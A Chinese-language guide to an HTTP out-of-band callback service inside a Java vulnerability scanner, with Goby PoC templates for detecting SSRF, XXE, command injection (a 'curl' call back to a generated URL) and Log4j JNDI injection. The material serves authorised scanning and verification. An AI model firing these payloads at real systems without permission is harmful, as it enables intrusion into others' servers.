# HTTP反连平台使用说明

## 📖 概述

HTTP反连平台是一种用于检测SSRF、XXE、RCE等漏洞的外带数据检测技术。通过生成唯一的HTTP URL，让目标服务器主动发起HTTP请求到该URL，从而证明漏洞存在。

---

## 🎯 支持的平台

### 1. Interactsh (推荐) ⭐

**官网**: https://app.interactsh.com/  
**特点**:
- ✅ 免费开源
- ✅ 功能强大，支持HTTP/DNS/SMTP等
- ✅ 无需注册即可使用
- ✅ 可自建服务器

**配置**:
```java
// 使用默认服务器 oast.pro
HttpLogService.setPlatform(HttpLogService.Platform.INTERACTSH);

// 或配置自定义服务器
HttpLogService.configureInteractsh("interact.sh", null);
```

### 2. RequestBin

**官网**: https://requestbin.com/  
**特点**:
- ✅ 简单易用
- ⚠️ 有使用限制
- ⚠️ 需要注意隐私

**配置**:
```java
HttpLogService.setPlatform(HttpLogService.Platform.REQUESTBIN);
```

### 3. 自定义平台

**特点**:
- ✅ 完全可控
- ✅ 支持内网环境
- ⚠️ 需要自己搭建

**配置**:
```java
HttpLogService.configureCustom("http://your-server.com/api", "your-token");
HttpLogService.setPlatform(HttpLogService.Platform.CUSTOM);
```

---

## 🚀 快速开始

### 基础使用

```java
// 1. 生成HTTP反连URL
String httpUrl = HttpLogService.generateHttpLogUrl();
System.out.println("HTTP反连URL: " + httpUrl);

// 2. 将URL用于漏洞测试
// 例如: http://vulnerable.com/fetch?url=http://abc123.oast.pro

// 3. 等待几秒钟让目标服务器发起请求
Thread.sleep(5000);

// 4. 查询是否有请求记录
boolean hasRequest = HttpLogService.hasHttpRequest(httpUrl);
if (hasRequest) {
    System.out.println("检测到HTTP请求，漏洞存在！");
} else {
    System.out.println("未检测到请求，可能不存在漏洞");
}
```

---

## 📝 在Goby POC中使用

### 方法1: 使用 set_variable

```json
{
  "Request": {
    "method": "POST",
    "uri": "/api/fetch",
    "data": "url={{{callback_url}}}",
    "set_variable": [
      "callback_url|httplog|generate|"
    ]
  }
}
```

**解析过程**:
1. `callback_url|httplog|generate|` → 生成HTTP反连URL
2. URL存储到变量 `callback_url`
3. `{{{callback_url}}}` 被替换为实际URL
4. 最终data: `url=http://abc123.oast.pro`

### 方法2: 直接使用 @@httplog() 函数

```json
{
  "Request": {
    "method": "POST",
    "uri": "/api/fetch",
    "data": "url=@@httplog()"
  }
}
```

**处理过程**:
1. `@@httplog()` 在发送请求前被处理
2. 替换为实际的HTTP反连URL
3. 最终data: `url=http://abc123.oast.pro`

---

## 🔍 典型应用场景

### 场景1: SSRF检测

```json
{
  "Name": "SSRF漏洞检测",
  "ScanSteps": ["AND", {
    "Request": {
      "method": "POST",
      "uri": "/api/proxy",
      "data": "target=@@httplog()"
    },
    "ResponseTest": {
      "checks": [{
        "variable": "$code",
        "operation": "==",
        "value": "200"
      }]
    }
  }]
}
```

**检测逻辑**:
1. 发送SSRF Payload，包含HTTP反连URL
2. 如果目标服务器存在SSRF，会请求该URL
3. 在HTTP反连平台查询记录
4. 有记录则证明漏洞存在

---

### 场景2: XXE外带数据

```json
{
  "Request": {
    "method": "POST",
    "uri": "/api/parse",
    "header": {
      "Content-Type": "application/xml"
    },
    "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"@@httplog()\">]><root>&xxe;</root>",
    "set_variable": []
  }
}
```

**用途**: 检测XXE漏洞并外带数据

---

### 场景3: RCE验证（命令执行回连）

```json
{
  "Request": {
    "method": "GET",
    "uri": "/api/exec?cmd=curl {{{callback_url}}}",
    "set_variable": [
      "callback_url|httplog|generate|"
    ]
  }
}
```

**用途**: 通过curl/wget命令回连验证RCE

---

### 场景4: Java反序列化（JNDI注入）

```json
{
  "Request": {
    "data": "${jndi:ldap://{{{httplog}}}/Exploit}",
    "set_variable": [
      "httplog|httplog|generate|"
    ]
  }
}
```

**用途**: 检测Log4j等JNDI注入漏洞

---

## 🔧 高级配置

### 配置Interactsh自建服务器

```java
// 使用自己搭建的Interactsh服务器
HttpLogService.configureInteractsh("your-domain.com", "your-token");
```

### 配置自定义平台

```java
// 使用完全自定义的HTTP反连服务
HttpLogService.configureCustom(
    "http://your-server.com/api/callback",
    "your-api-token"
);
HttpLogService.setPlatform(HttpLogService.Platform.CUSTOM);
```

---

## 📊 对比 DNSLog vs HTTPLog

| 特性 | DNSLog | HTTPLog |
|-----|--------|---------|
| **协议** | DNS | HTTP/HTTPS |
| **数据量** | 受限（域名长度）| 较大（可传输更多数据）|
| **防火墙** | 通常允许 | 可能被拦截 |
| **速度** | 快 | 稍慢 |
| **数据类型** | 文本 | 支持各种格式 |

**选择建议**:
- ✅ **优先使用DNSLog**: 更稳定，成功率更高
- ✅ **HTTPLog作为补充**: 当DNSLog无法使用时，或需要传输更多数据时

---

## 💡 最佳实践

### 1. 等待时间

```java
// 发送payload后，等待足够的时间
Thread.sleep(5000);  // 至少5秒

// 然后再查询记录
boolean hasRequest = HttpLogService.hasHttpRequest(url);
```

### 2. 多次查询

```java
// 对于不稳定的网络，可以多次查询
int maxRetries = 3;
for (int i = 0; i < maxRetries; i++) {
    if (HttpLogService.hasHttpRequest(url)) {
        return true;  // 检测到请求
    }
    Thread.sleep(2000);  // 等待2秒再查询
}
return false;  // 未检测到请求
```

### 3. 清理缓存

```java
// 在扫描完成后清理缓存
HttpLogService.clearCache();
```

---

## 🎓 完整示例

### SSRF检测完整流程

```java
import com.potato.potatotool.content.redTeam.vulnScanner.http.HttpLogService;

public class SSRFDetection {
    public static void main(String[] args) throws Exception {
        // 1. 生成HTTP反连URL
        String callbackUrl = HttpLogService.generateHttpLogUrl();
        System.out.println("生成回调URL: " + callbackUrl);
        
        // 2. 构造SSRF Payload
        String ssrfPayload = "http://target.com/fetch?url=" + callbackUrl;
        
        // 3. 发送SSRF Payload
        // sendRequest(ssrfPayload);
        System.out.println("发送SSRF Payload...");
        
        // 4. 等待目标服务器请求
        System.out.println("等待回连...");
        Thread.sleep(5000);
        
        // 5. 查询记录
        String records = HttpLogService.queryHttpLogRecords(callbackUrl);
        
        // 6. 判断漏洞
        if (records != null && !records.isEmpty()) {
            System.out.println("✅ 检测到HTTP请求，SSRF漏洞存在！");
            System.out.println("请求记录: " + records);
        } else {
            System.out.println("❌ 未检测到请求，可能不存在SSRF");
        }
    }
}
```

---

## 🆚 与DNSLog的对比使用

```json
{
  "Name": "双重验证 - DNS+HTTP",
  "ScanSteps": ["OR", 
    {
      "Request": {
        "data": "url=@@dnslog()"
      }
    },
    {
      "Request": {
        "data": "url=@@httplog()"
      }
    }
  ]
}
```

**优势**: 提高检测成功率，任意一种方式成功即可

---

## ⚠️ 注意事项

### 1. 隐私保护
- HTTP反连平台可能记录所有请求数据
- 不要在payload中包含敏感信息
- 使用可信的平台或自建平台

### 2. 网络要求
- 目标服务器必须能访问互联网
- 某些防火墙可能阻止HTTP外连
- 内网环境可能无法使用

### 3. 时间延迟
- 需要足够的等待时间（建议5-10秒）
- 网络延迟可能影响检测
- 可能需要多次查询

---

## 🔧 故障排查

### 问题1: 无法生成URL

**原因**: 平台服务不可用  
**解决**: 
```java
// 测试平台连通性
HttpLogService.TestResult result = HttpLogService.testInteractshConnectivity();
System.out.println(result);

// 切换到备用平台
HttpLogService.setPlatform(HttpLogService.Platform.INTERACTSH);
```

### 问题2: 查询不到记录

**原因**: 
1. 等待时间不够
2. 目标服务器未发起请求
3. 防火墙阻止

**解决**:
```java
// 增加等待时间
Thread.sleep(10000);  // 等待10秒

// 多次查询
for (int i = 0; i < 5; i++) {
    if (HttpLogService.hasHttpRequest(url)) {
        break;
    }
    Thread.sleep(2000);
}
```

---

## 📚 API参考

### 核心方法

```java
// 生成HTTP反连URL
String url = HttpLogService.generateHttpLogUrl();

// 查询请求记录
String records = HttpLogService.queryHttpLogRecords(url);

// 检查是否有请求
boolean hasRequest = HttpLogService.hasHttpRequest(url);

// 清除缓存
HttpLogService.clearCache();
```

### 配置方法

```java
// 配置平台
HttpLogService.setPlatform(Platform.INTERACTSH);
HttpLogService.configureInteractsh("oast.pro", null);
HttpLogService.configureCustom("server", "token");

// 获取当前平台
Platform current = HttpLogService.getCurrentPlatform();

// 测试连通性
TestResult result = HttpLogService.testInteractshConnectivity();
```

---

## 🎉 总结

HTTP反连平台是检测外带类漏洞的强大工具，配合DNSLog使用可以大幅提高漏洞检测成功率。

**推荐组合**:
- 优先DNSLog（成功率高）
- HTTPLog作为补充（数据量大）
- 双重验证（提高准确性）

---

**文档版本**: v1.0  
**最后更新**: 2025-11-01  
**维护者**: Potato


















